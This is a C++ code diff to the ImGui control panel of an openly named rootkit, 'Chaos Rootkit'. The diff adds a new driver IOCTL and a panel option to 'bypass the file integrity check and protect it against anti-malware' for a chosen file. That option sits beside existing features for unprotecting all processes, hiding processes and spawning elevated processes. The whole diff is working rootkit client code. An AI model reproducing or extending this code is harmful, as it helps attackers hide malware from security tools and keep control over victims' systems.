@@ -104,6 +104,8 @@ Texture	readTextureFile()
 
 #define RESTRICT_ACCESS_TO_FILE_CTL CTL_CODE(FILE_DEVICE_UNKNOWN,0x169,METHOD_BUFFERED ,FILE_ANY_ACCESS)
 
+#define BYPASS_INTEGRITY_FILE_CTL CTL_CODE(FILE_DEVICE_UNKNOWN,0x170,METHOD_BUFFERED ,FILE_ANY_ACCESS)
+
 BOOL loadDriver(char* driverPath) {
     SC_HANDLE hSCM, hService;
 
@@ -243,6 +245,7 @@ int main(int, char**)
     bool is_rootket_connected = false;
     bool unprotect_all_processes = false;
     bool restrict_access_to_file = false;
+    bool spoof_file = false;
     bool hide_specific_process = false;
     bool spawn_elevated_process = false;
     HANDLE hdevice = NULL;
@@ -352,6 +355,8 @@ int main(int, char**)
             ImGui::Checkbox("Unprotect All Processes", &unprotect_all_processes);
 
             ImGui::Checkbox("Restrict Access To File", &restrict_access_to_file);
+
+            ImGui::Checkbox("Bypass the file integrity check and protect it against anti-malware", &spoof_file);
 
             ImGui::Text("Application average %.3f ms/frame (%.1f FPS)", 1000.0f / io.Framerate, io.Framerate);
 
@@ -484,6 +489,12 @@ int main(int, char**)
 
         if (restrict_access_to_file)
         {
+
+            if (spoof_file == 1)
+            {
+                MessageBoxA(0, "You can only enable either restrict access to files or integrity bypass at a time.", 0, 0);
+                spoof_file = 0;
+            }
             fopera operation_client = { 0 };
             ImGui::Begin("Chaos Rootkit PANEL", &restrict_access_to_file);
 
@@ -492,6 +503,7 @@ int main(int, char**)
 
             ImGui::InputTextWithHint("###", "Filename", filename, IM_ARRAYSIZE(filename));
             int i = 0;
+
             if (ImGui::Button("restrict access to file"))
             {
 
@@ -518,11 +530,67 @@ int main(int, char**)
                 }
             }
 
+
             if (component_color_handler == 1)
             {
                 ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f));
 
-                ImGui::Text("Faild to send IOCTL, Please make sure to provide a filename and valid pid or a file is already hidden.");
+                ImGui::Text("Faild to send IOCTL, Please make sure to provide a filename and valid pid.");
+            }
+            if (component_color_handler == 2)
+            {
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f));
+
+                ImGui::Text("IOCTL sent, File Restricted");
+            }
+
+            if (component_color_handler)
+                ImGui::PopStyleColor();
+            ImGui::End();
+        }
+
+        if (spoof_file)
+        {
+            if (restrict_access_to_file == 1)
+            {
+                MessageBoxA(0, "You can only enable either restrict access to files or integrity bypass at a time.",0,0);
+                restrict_access_to_file = 0;
+            }
+            fopera operation_client = { 0 };
+            ImGui::Begin("Chaos Rootkit PANEL", &spoof_file);
+
+            ImGui::InputTextWithHint("###", "Filename", filename, IM_ARRAYSIZE(filename));
+            int i = 0;
+
+            if (ImGui::Button("bypass integrity check"))
+            {
+
+                if (strlen(filename))
+                {
+                    size_t len = mbstowcs(NULL, filename, 0);
+
+                    mbstowcs(operation_client.filename, filename, len + 1);
+
+                    printf("filename to restrict access ( %ls ) \n", operation_client.filename);
+
+                    if (DeviceIoControl(hdevice, BYPASS_INTEGRITY_FILE_CTL, (LPVOID)&operation_client, sizeof(operation_client), &lpBytesReturned, sizeof(lpBytesReturned), 0, NULL))
+                        component_color_handler = 2;
+                    else
+                        component_color_handler = 1;
+                }
+                else
+                {
+                    printf("Please make sure to provide filename\n");
+                    component_color_handler = 1;
+                }
+            }
+
+
+            if (component_color_handler == 1)
+            {
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.0f, 0.0f, 1.0f));
+
+                ImGui::Text("Faild to send IOCTL, Please make sure to provide a filename.");
             }
             if (component_color_handler == 2)
             {
